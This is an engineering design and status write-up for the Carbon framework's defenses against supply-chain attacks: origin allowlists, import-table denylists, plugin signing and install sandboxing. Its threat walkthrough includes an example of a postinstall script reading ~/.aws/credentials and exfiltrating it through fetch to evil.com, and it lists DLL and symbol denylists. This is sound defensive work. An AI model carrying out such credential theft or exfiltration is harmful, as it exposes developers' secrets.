# Developer-supply-chain security — the full plan

Written up 2026-08-25 after an extended design conversation. Consolidates everything
decided into one reference. Cross-references V1's `04-security-and-capabilities/`
where relevant, and explicitly notes the one place this plan **diverges** from a V1
draft decision (`network-security-stance.md`'s "no ambient fetch" stance) and why.

## Status

**Shipped and verified** (real `cargo test`/`bun test` runs, not assumed):
- `fs` scoped to the app's own data/config/cache/temp dirs; arbitrary paths (`~/.ssh`,
  etc.) rejected. `dialog.openFileText`/`saveFileText` added so user-chosen files
  outside those dirs still work without a raw path ever reaching JS.
  (`solutions/infrastructure/os/adapters/filesystem/fs.rs`,
  `.../adapters/desktop/dialog.rs`)
- `fetch`/`WebSocket` origin-allowlist enforcement, reusing the existing SSRF-hardening
  machinery (redirect re-validation, private/metadata-IP blocking) that was previously
  only wired to the AI-proxy path. `carbon.toml [net] allowed_origins` — empty by
  default, `"*"` is an explicit opt-out. (`solutions/infrastructure/os/adapters/net/net.rs`,
  `products/carbon/composition/manifest.rs`)
- `process` spawning (`__cm_proc_exec`/`__cm_proc_spawn`) no longer installed on
  `globalThis` unless `carbon.toml [runtime] process = true` — closes the gap where
  import-gating alone doesn't stop code from reaching an always-present raw global by
  name. Verified the startup-phase-sequence test (`launch_test`, all 6 cases) still
  passes with the phase marker unconditional and only the registration itself gated.
  (`solutions/infrastructure/os/lib.rs::register_all`, both `mini.rs` and `blitz.rs`
  call sites updated; `blitz.rs` defaults to disabled — it has no `carbon.toml` read at
  all yet, a separate, smaller gap to close later.)
- `carbon:fs`'s stale table entry removed (it referenced globals that never matched
  what `fs.rs` actually installs) and `carbon:process` added, first-party-only —
  refused when imported from `node_modules/`, defense-in-depth on top of the runtime
  gate above. (`solutions/integrations/bundler/vite/domain/module-graph.js`,
  `.../infrastructure/plugins/imports.js`)
- Credential-broker fetch: `carbon:secrets`' `fetchWithStoredCredential(url, {service,
  account})` — the OS-keychain secret is looked up and substituted into the request
  header entirely inside Rust; it never becomes a JS-visible value.
  (`net.rs::start_fetch_with_credential`, `net_shim.js`)
- `products/carbon-cli`'s own toolchain dependencies (`vite`, `@babel/core`, etc.) now
  have a committed `bun.lock` pinning exact resolved versions — previously had none at
  all, so every install re-resolved caret ranges against whatever was newly published.
- npm lifecycle-script lockdown: `products/carbon-cli/package.json` and
  `.config/package.json` ship `"trustedDependencies": []`; `BuildProjectUseCase`'s
  `ensureNodeModules` uses `--frozen-lockfile` when a lockfile exists (with a
  sha256-stamp cache, `InstallState.ts`, so an already-in-sync build skips the bun
  spawn); all 5 scaffolding presets carry the same lockdown. 11 real integration tests,
  no mocks. (`solutions/capabilities/tooling/bundling/...`,
  `solutions/capabilities/tooling/scaffolding/infrastructure/templates/package-json.ts`)
- Zig plugin signing and load-time verification (Layer 3 step 7): Ed25519,
  `carbon-plugin-trust` crate — SHA-256 content hash, detached `.sig` files, a
  hardcoded revocation-list stub, `carbon-plugin-sign` (keygen/sign/verify/hash).
  `plugin_loader.rs` verifies + checks revocation immediately before
  `Library::new`, hardcoded public key. `CARBON_ALLOW_UNSIGNED_PLUGINS` is the
  deliberate escape hatch — set only by `carbon dev` (never `carbon run` or a
  distributed build) so the local-source plugin edit/reload loop keeps working
  unsigned; `carbon run`'s `release: true` build still needs a real signature, same
  as anything Carbon publishes. Verified by flipping the env var and watching
  `an_unsigned_plugin_is_refused` go from refused to loaded.
  (`solutions/capabilities/plugin/trust/rust/`,
  `solutions/infrastructure/plugin-host/adapters/plugin_loader.rs`)
- **The first-party escape hatch itself** (Layer 3's "Escape hatch, deliberately
  preserved" — previously `carbon run` against an app with a local plugin simply
  failed to load it, a known gap this closes): `carbon plugin dev-key` mints a
  per-developer Ed25519 key at `~/.carbon/keys/dev-signing.key` (via
  `carbon-plugin-sign keygen --out`, reused as-is) and prints its public half for
  a human to paste into a project's own carbon.toml `[dev-signing] trusted_keys`
  — an explicit, project-scoped opt-in, never a bypass. `SyncPluginsUseCase`
  signs every locally-built plugin's `carbon run` (`release: true`) artifact with
  that key; `plugin_loader.rs`'s `verify_with_trust_anchors` tries Carbon's
  official key first, then each configured dev key, accepting the first that
  verifies — still a real Ed25519 signature check either way, just a second
  trust anchor. `carbon dev`'s unsigned Debug loop is unaffected. Verified
  end-to-end against `labs/examples/pulse` (3 local plugins): refused with a
  clear message before `[dev-signing]` was added, all 3 loaded with signatures
  verified after. (`solutions/capabilities/plugin/lifecycle/infrastructure/
  PluginSigner.ts`, `.../application/usecases/SyncPluginsUseCase.ts`,
  `solutions/contracts/app/rust/config.rs`'s `DevSigningSection`,
  `solutions/infrastructure/plugin-host/adapters/plugin_loader.rs`,
  `products/carbon-cli/presentation/commands/plugins/plugin.command.ts`)
- The Zig import-table denylist checker (Layer 3 step 3), `carbon-import-check`,
  merged into the same `carbon-plugin-trust` crate (`domain/import_policy.rs` +
  `application/import_check.rs` + `tools/import_check.rs`): a module denylist
  (`kernel32`/`user32`/`ntdll`/`advapi32`/network DLLs) plus a symbol denylist
  (`LoadLibrary*`/`GetProcAddress`/`GetModuleHandle*`, denied from *every* module,
  unconditionally — the loophole a static check alone can't see through) on top of
  an allowlist for the MSVC CRT a Zig artifact needs. `tests/fixtures/zig/{allowed,
  denied}-plugin` are real compiled positive/negative fixtures, not assertions
  against synthetic data.
- **The checker-vs-SDK reconciliation** — the real gap the checker's original design
  surfaced: every legitimate Carbon plugin calls `setGlobalString`/`setGlobalNumber`/
  `setGlobalFunction`/`eval`, and the SDK used to resolve those via
  `GetProcAddress(GetModuleHandle(NULL))` at load time — exactly the symbols the
  checker denies unconditionally, for the reason the checker names ("a plugin that
  can resolve one arbitrary OS symbol at runtime can resolve any of them"). Fixed by
  widening the ABI instead of weakening the checker: `carbon_plugin.h` bumped to ABI
  1.1, appending `set_global_string`/`set_global_number`/`set_global_function`/`eval`
  as function pointers on `CarbonApp` itself — the same shape `push_event`/
  `request_paint` already used — so a plugin gets JS-global installation without any
  dynamic symbol resolution at all. `host_exports.rs` fills the four fields in
  `HostCarbonAppStorage::new()`; the Zig SDK's four wrapper methods call through
  `self.raw.set_global_*`/`self.raw.eval` instead of the old
  `resolveHostSymbol`/`GetProcAddress` machinery, which is deleted. The old
  `carbon_js_*` free functions stay exported for ABI-1.0 plugins and non-C SDKs that
  haven't moved yet. **Verified empirically, not just by type-checking**: rebuilt all
  three real Pulse plugins (`carbon-hotkey`/`carbon-idle`/`carbon-pulse`) against the
  new SDK and ran `carbon-import-check --list` against each compiled `.dll` — zero
  `GetProcAddress`/`GetModuleHandle*` imports in any of them, where before the fix
  every one would have failed the checker by construction. `carbon-hotkey` still
  legitimately imports `user32.dll` (`RegisterHotKey`) — the documented first-party
  escape hatch (`ImportPolicy::allow_module`), a different, already-accounted-for
  case. (`products/carbon-ext/presentation/include/carbon_plugin.h`,
  `solutions/infrastructure/plugin-host/abi/host_exports.rs`,
  `solutions/capabilities/plugin/sdk/zig/src/carbon_sdk.zig`)
- zig 0.16.0 toolchain drift: `std.os.windows(.kernel32)` no longer declares
  `GetModuleHandleW`/`GetProcAddress` (confirmed by grepping the installed std
  source) — moot now that the SDK doesn't call them at all, but the finding stays
  useful for anything else that might reach for them. All three Pulse plugins'
  `build.zig.zon` also needed the zig-0.16-mandatory `.fingerprint` field, real
  values from real `zig build` errors.
- `carbon-blitz` wired into the same `[net]`/`[runtime]` gating `carbon-mini` already
  had (`composition/blitz.rs`) — previously hardcoded `process_enabled = false` and no
  origin allowlist at all.

- **Found and fixed, not just noted**: CI's "build examples" job caught the Pulse
  bundler-wiring gap for real (`No matching export ... for import "setActive"`). Two
  independent bugs in `solutions/integrations/bundler/vite`'s manifest discovery:
  `discoverManifests` only ever scanned a `<workspaceRoot>/packages/*/` layout nothing
  in this tree uses — an app's own plugins live at `<projectRoot>/plugins/<name>/`
  (`run.command.ts`'s `syncLocalPlugins`), never scanned at all until
  `discoverLocalManifests(projectRoot)` was added; and `normalizeManifest` required a
  `[plugin]` wrapper section no real `carbon-plugin.toml` has ever used. Diagnosing it
  also surfaced a third bug it was masking: all three Pulse plugins' own
  `carbon-plugin.toml` had `modules = [...]` sitting right after `[capabilities]` with
  no section header of its own — real TOML parses that as `capabilities.modules`, the
  exact gotcha the same file's own comment already warned about for
  `extension-points`. Verified: 3 new regression tests reproducing the real manifest
  shape and the TOML-misplacement gotcha directly, `carbon build` on all 6 real
  example apps (the exact loop CI's job runs) succeeding, pulse included.

**Not yet started** (real, separate pieces of work): the sandboxed install/build
broker (Layer 2); hash-pinned Zig dependency enforcement; mandatory `ReleaseSafe`
enforcement (nothing currently refuses to sign a Debug-built plugin); wiring
`carbon-import-check` and `carbon-plugin-sign` into an actual publish pipeline (both
exist and work as standalone binaries, run by hand so far); `--frozen-lockfile`-style
enforcement for whatever end users' own `carbon.toml` machinery installs day to day,
beyond `carbon-cli`'s own toolchain deps.

## The two things that make Carbon Carbon, restated as constraints on this plan

1. **Faster and more efficient than anything else**, including the dev loop itself —
   TypeScript-first, no Rust split, Zig only for native gaps, prebuilt once and
   dispatched at native speed forever after. Nothing in this plan may add cost to
   hot-reload or to the shipped runtime's hot path (`paint.before` etc.).
2. **A compromised developer is not an option.** Past months' supply-chain incidents
   (compromised/malicious npm packages stealing tokens, compromising machines) are the
   direct motivation. The goal is not "we reviewed the ecosystem" — it's "the
   architecture makes the theft impossible regardless of review," for both the JS side
   (npm) and the native side (Zig plugins).

These two constraints are why this plan looks the way it does: every security
mechanism below is placed at a point in the pipeline that **already has natural
latency** (install, build, publish) and **never** at the point that runs on every
keystroke (hot reload) or every frame (paint).

## The organizing principle: match the real web platform, restrictions included

The apparent tension — "no restrictions on the JS side, don't make people learn
Carbon-specific imports" vs. "a malicious npm package must not be able to steal
secrets" — dissolves once the target is **"behave exactly like a real, spec-compliant
browser," not "behave like an unrestricted Node process."** Browsers already resolved
this exact tension, for the exact same reason (arbitrary third-party JS, including ad
scripts, runs in every browser tab):

- Where a browser API exists, expose it **ambiently, under its real name, with its
  real restriction model** — `fetch`, `Headers`, `Request`, `Response`,
  `AbortController`, `URL`/`URLSearchParams`, `localStorage`-shaped storage,
  `navigator.clipboard` (permission-gated), `Notification` (permission-gated). Any
  library written against the web platform — TanStack Query, axios, ky, anything —
  works completely unmodified, because it's not calling anything Carbon-specific; it's
  calling the same globals it would in a browser.
- Where **no browser API exists at all** — raw filesystem access, raw process
  spawning, native hardware — there is no ambient web equivalent to preserve, so this
  is exactly where an explicit, non-web `carbon:*` import belongs. Zero compatibility
  cost, because no legitimate frontend library ever assumed `fs.readFile` was an
  ambient global.

This directly answers "I don't want restrictions on npm for pure-frontend things, but
it's okay if the plugin side has friction" — the boundary the principle draws is
*exactly* that boundary already.

### Where this diverges from V1

`V1/.local/notes/roadmap/04-security-and-capabilities/network-security-stance.md`
states: *"The QuickJS engine has no built-in `fetch`... app code goes through
`@needs("net.http", origins=[...])`"* — i.e., V1's draft wanted no ambient network API
at all, capability-import-gated instead. This plan keeps V1's actual **enforcement
mechanism** (an origin allowlist, checked at the point the connection is actually
dialed, not at the point of import — V1's own words: *"even if a plugin tries to
construct a URL outside its scope, the client refuses to dial... there is no 'the
plugin built the URL string at runtime' escape"*) but moves *where* it applies: from
"only code that imported the capability" to "the `fetch` implementation itself,
regardless of caller." Same security property (an app with no declared origins has
zero network attack surface, same as V1's "an app that doesn't load `carbon-net` has
no network attack surface"), ambient ergonomics instead of import-gated ones.

## The Fs/Net split — a hard rule, not a default

No single trust domain ever holds both filesystem access and network egress at once.
Concretely:

- **Zig plugins get no network capability at all.** The SDK never exposes a network
  verb, and the import-table check denies `ws2_32.dll`, `wininet.dll`, and
  `winhttp.dll` alongside `kernel32`/`user32`/`ntdll`. A plugin that needs to report
  something to a server pushes an effect to JS (which already has `fetch`) and, if it
  needs the result back, JS calls into the plugin's own `setGlobalFunction`-exposed
  handler with it. Nothing is impossible — it's routed through the side that's allowed
  to do it, which is what effects-as-data already pushes plugin authors toward anyway.
- **JS gets no raw filesystem access at all — not even first-party app code.**
  `carbon:fs` does not exist as an importable module for anyone. File access is
  host-brokered native dialogs only (`showOpenDialog()`/`showSaveDialog()`, returning
  file bytes or a scoped handle, never a raw path an app can hand to an unrestricted
  reader) — which costs nothing against "looks like web," because that's exactly how
  the real File System Access API already works: user-gesture-gated, no ambient path
  access, ever.
- **The one narrow, deliberate exception:** reading the app's own bundled resources, at
  a fixed path inside its own install directory, with `../` traversal structurally
  impossible (`readOwnAsset(relativePath)`, resolved and bounds-checked against the
  bundle root before any read happens). This doesn't weaken the rule — it can never
  reach anything outside what the app author shipped themselves, so it was never the
  thing the rule protects against.

Why this is worth a name of its own rather than living inside Layer 1: even if some
future bug slips past every other check on *one* side, there is structurally no
exfiltration path, because the capability needed to complete a theft — reading
something sensitive, or sending it anywhere — lives on the other side of a boundary
that's independently locked down. This is a security property simple enough to state
to a customer in one sentence and have it actually be true: *the side of your app that
can touch your files cannot reach the network, and the side that can reach the network
cannot touch your files.*

## Verified facts this plan is built on (checked against real code/docs this session, not assumed)

- `solutions/infrastructure/os/adapters/filesystem/fs.rs:27` and the equivalent in
  `net.rs`: `ctx.globals().set("__cm_fs_read_text", ...)` — these ARE ambient globals
  today, reachable by any code in the bundle including transitive npm dependencies, with
  zero capability check. This is the concrete hole Layer 1 closes.
- No ambient `fetch` currently exists (checked: no `globalThis.fetch` assignment
  anywhere in `solutions/interface/stdlib`) — so introducing one deliberately, scoped
  correctly, is a clean addition, not un-doing an existing unscoped one.
- Plugin loading (`solutions/infrastructure/plugin-host/adapters/plugin_loader.rs:327`)
  uses `libloading::Library::new` — full in-process trust, no sandbox. The manifest
  capability check (lines 340–380) gates *which extension-point symbols get dispatched*,
  not general code execution inside an already-called entry point like
  `carbon_plugin_register` (needs zero capabilities). This is why import-table locking
  (Layer 3) is necessary — the existing check alone doesn't stop it.
- Windows AppContainer is real, process-level (not VM) sandboxing: restricted token +
  package/capability SIDs + Low Integrity Level + filesystem/registry virtualization.
  Confirmed current production precedent for exactly this use case: the Codex CLI
  coding agent uses Windows restricted tokens + AppContainer + synthetic SIDs to
  isolate arbitrary agent-run commands from the host. Confirmed honest tradeoff:
  AppContainer's default-deny is aggressive enough that real deployments have had to
  carefully punch narrow holes rather than broad ones — same discipline as the SDK
  verb design, one level down.
- Elm 0.19: only `elm-lang`/`elm-explorations` can publish "kernel" (native) code;
  the compiler itself refuses to compile kernel code from any other package. Real,
  decade-long, production-proven precedent for "compiler-enforced exclusion of the
  unsafe escape hatch, not review-enforced."

## The full system

### Layer 0 — the hard constraint
Every layer below sits at install, build, or publish time. None of them touch hot
reload or the runtime hot path. This is what keeps "100% safety" and "faster than
Tauri" from being in tension — Tauri's problem is that *everything* is Rust, so
*every* change pays compile cost in the loop you touch constantly; Carbon's TS-first
split means the hot loop never touches any of this at all.

### Layer 1 — web-shaped ambient JS surface, restricted at the point of use
- `fetch`/`Headers`/`Request`/`Response`/`AbortController`/`URL` ship as real, ambient,
  spec-shaped globals. The `fetch` implementation itself refuses any origin not in the
  app's declared allowlist (`carbon.toml [net] allowed_origins = [...]`, checked in the
  Rust HTTP client, same shape as V1's `Origins(&[...])` scope, just applied ambiently).
  An app that declares no origins has zero network attack surface — the plugin/client
  code for it is present but never has anywhere it's allowed to connect.
- `localStorage`-shaped storage: ambient, unrestricted, exactly matching how browsers
  already treat it (per-origin, and there's only one origin here).
- `navigator.clipboard`, `Notification`: ambient constructors, but gated behind a
  runtime permission prompt, matching real browser UX users already understand.
- `process`/hardware access (where no browser equivalent exists at all): moves off
  `globalThis` entirely, behind `carbon:process` / etc., resolvable only from the app's
  own `src/`, never from `node_modules/` — the resolver
  (`solutions/integrations/bundler/vite/infrastructure/plugins/imports.js`) already has
  the capability-check machinery; it needs the first-party-vs-dependency distinction
  added.
- `fs` specifically does **not** get this "first-party can still import it" treatment —
  see "The Fs/Net split" above. No `carbon:fs` exists for anyone. File access is
  dialog-mediated only, plus the narrow `readOwnAsset` exception.

### Layer 2 — universal sandboxed install/build broker (`carbon install`)
One CLI entry point for npm, Zig, and Carbon-native plugin installs. Backed by
OS-native process sandboxing per platform — **not a VM, not Docker**:
- Windows: AppContainer (restricted token, virtualized fs/registry view, Low IL).
- Linux: bubblewrap (namespaces + seccomp, no root, millisecond startup — what
  Flatpak already runs on, in production, at scale).
- macOS: Sandbox/`sandbox-exec`.

Every `bun install` / `zig build` / `carbon plugin install` routes through this by
default, for every developer, not just curated marketplace submissions — this is what
protects an ordinary developer's own routine dependency install, not just a
build-server pipeline.

npm lifecycle scripts (postinstall/preinstall/prepare) do not run at all unless the
exact package is listed in `trustedDependencies` (Bun's existing mechanism, defaulted
to strict). This alone removes the most common real-world attack vector. For the
allowlisted exception case: **pin trust to an exact version/hash, not just a package
name** — a compromised new release of a trusted package does not inherit the old
release's trust. The allowlisted script still runs inside the sandbox, not with raw
host privileges — being trusted-to-run and being unsandboxed are independent,
deliberately.

### Layer 3 — Zig plugin trust pipeline (proportionate rigor, because the surface is small and rare)
1. **Source-only submissions.** A community author submits Zig source +
   `carbon-plugin.toml`, never a compiled binary. Zig dependencies in
   `build.zig.zon` must be hash-pinned (Zig's package manager already supports this);
   reject any dependency declaration missing a hash.
2. **Build inside the same sandboxed broker** (Layer 2) — `build.zig` is arbitrary
   code and needs the same containment as any other install-time script.
3. **Mechanical import-table check** on the compiled artifact: every imported symbol
   must be a Carbon SDK function. Zero imports from `kernel32`/`user32`/`ntdll`/etc.,
   and — per the Fs/Net split — `ws2_32.dll`/`wininet.dll`/`winhttp.dll` are denied
   unconditionally too, not just "not yet granted." `LoadLibrary`/`GetProcAddress`/
   `GetModuleHandle` are explicitly denied as well — those are the dynamic-resolution
   loophole around a static import-table check. This applies
   to the *whole compiled binary*, so it catches a dangerous `extern` in a transitive
   Zig dependency exactly as well as one in the plugin author's own file.
4. **Mandatory `ReleaseSafe` (bounds-checked) build** + a static source scan rejecting
   manual pointer arithmetic (`@intToPtr` etc.) that escapes a host-provided buffer's
   given length. Closes the memory-corruption residual that the import-table check
   alone doesn't (a plugin with zero OS imports can still write out-of-bounds within
   its own process).
5. **Effects as data, not direct calls** (the Elm Architecture idea, applied to Zig):
   a plugin's exported function returns a `CarbonEffect` value describing what it wants
   done (`.register_hotkey = .{...}`) rather than calling `extern fn RegisterHotKey`
   directly. Only the trusted Rust host, which owns the real OS imports, interprets the
   value into an action. Combined with step 3, this isn't just convention — a plugin
   that tries to skip the pattern and call the OS directly fails the build.
6. **Carbon-only signing.** The artifact that passed 1–5 gets signed with Carbon's own
   key, never the author's, in a separate step that never itself executes untrusted
   code.
7. **Load-time signature verification** in `plugin_loader.rs` — an unsigned or
   wrong-signer `.dll` in `plugins/` does not load, regardless of how it got there.
8. **Revocation list**, checked at load time, so a mistake found after publish is
   fixable retroactively, not just prevented going forward.

**Escape hatch, deliberately preserved:** none of steps 1–7 apply to a developer's own
first-party plugin in their own app. Raw `extern` Zig, unsigned, side-loaded, full
power — exactly like this session's `carbon-hotkey`/`carbon-idle`/`carbon-pulse` — stays
available at the developer's own risk. The pipeline only gates what flows through
Carbon's public trust channel (the "install a stranger's plugin and it's guaranteed
safe" promise), which is where the promise is actually being made.

### Layer 4 — the SDK is the trust anchor; treat it accordingly
Once ambient authority is gone on both sides, the only remaining path to danger is a
bug in Carbon's own SDK functions — a few dozen, not thousands of plugins. This is the
one piece of the system that's an ongoing commitment rather than a one-time build:

- Continuous fuzzing of the SDK's own host-side implementation (`carbon_js_*`,
  `push_event`, etc.) — it's now the highest-value target in the whole system.
- Every new capability verb is deliberately designed narrow (a specific action, not a
  raw resource) before it ships — "propose → design the narrow shape → ship" as a
  standing process, not an ad-hoc exception granted under deadline pressure.
- Versioning discipline: the capability surface only ever grows deliberately, never as
  a quick fix that widens an existing verb.

## Known, permanent residual risks (stated honestly, not glossed over)

1. **A bug in an individual SDK verb's own logic** (e.g., insufficient validation in a
   narrowly-scoped function) — mitigated by fuzzing, never fully eliminated by
   architecture alone.
2. **Composability of individually-safe capabilities into something the user wouldn't
   want** (e.g., idle-tracking + network access combining into silent telemetry) — a
   trust/privacy review question at grant time, not a technical check.
3. **A bug in the sandbox implementation itself** (an AppContainer/bubblewrap escape).
   Rare, real, historically has had CVEs. The mitigation is defense-in-depth (multiple
   independent walls, per the attack walkthrough below) rather than any single layer
   being assumed perfect.
4. **Typosquatting** — a developer installing a malicious package by mistyping a
   popular name. None of the technical machinery here addresses this; it needs
   registry-level mitigation (namespace protection, warnings on low-download/newly
   published packages), a different category of defense entirely.
5. **Capability smuggling through the app's own data flow** (JS-specific): import-gating
   stops a dependency from directly importing `carbon:fs`; it doesn't by itself stop a
   malicious dependency from capturing a reference to a capability the app's own code
   legitimately holds and passes through a shared callback/object. Fully closing this
   needs realm/compartment isolation (SES/Hardened JavaScript's approach) — a real,
   larger lift, not required for the v1 shape of this plan but worth knowing about.

## One attack, walked through all four independent walls

A popular npm dependency gets compromised; the new version's postinstall script tries
to read `~/.aws/credentials` and exfiltrate it.

1. Not on `trustedDependencies` → the script never executes. Stopped before it starts.
2. If it were allowlisted (needed a legitimate build step) → runs inside the
   AppContainer/bubblewrap sandbox → tries to open `~/.aws/credentials` → OS denies the
   read; that path isn't in the sandboxed process's filesystem view. Stopped.
3. If it instead tried to do damage once bundled into the *running* app → looks for
   `globalThis.__cm_fs_*` → doesn't exist, moved behind `carbon:fs`, unreachable from
   `node_modules/`. Stopped a third, independent way.
4. If it tried to exfiltrate over the network instead → calls `fetch("https://evil.com")`
   → the app's declared origin allowlist doesn't include `evil.com` → the client
   refuses to dial. Stopped a fourth way.

Four independent mechanisms, each closing a different stage/vector of the same attack,
none of them re-checked on every hot reload.

## Build order

1. **Layer 1** (ambient-authority removal + web-shaped fetch) — smallest, fastest to
   ship, directly answers the exact incident pattern being cited, and is the strongest
   thing to say to a customer today.
2. **Layer 2** (the sandboxed install broker) — the foundation everything else routes
   through.
3. **Layers 3–4** build on top once 1–2 exist.

## What "100%" honestly means at the end of this

Every realistic version of "malicious code executes during install" or "malicious code
reaches a dangerous capability once bundled/loaded" is closed by architecture, not by
review, on both the JS and Zig sides. What remains is bounded to a small, named list
(SDK correctness, sandbox-implementation correctness, human attention at install time,
capability-composability judgment) — each one specific and addressable, rather than an
open-ended "hope nothing bad is in this package." No comparable framework (Tauri,
Electron) does all of this today; none of them sandbox install-time execution by
default, remove ambient stdlib authority, and lock down native plugin imports at once.
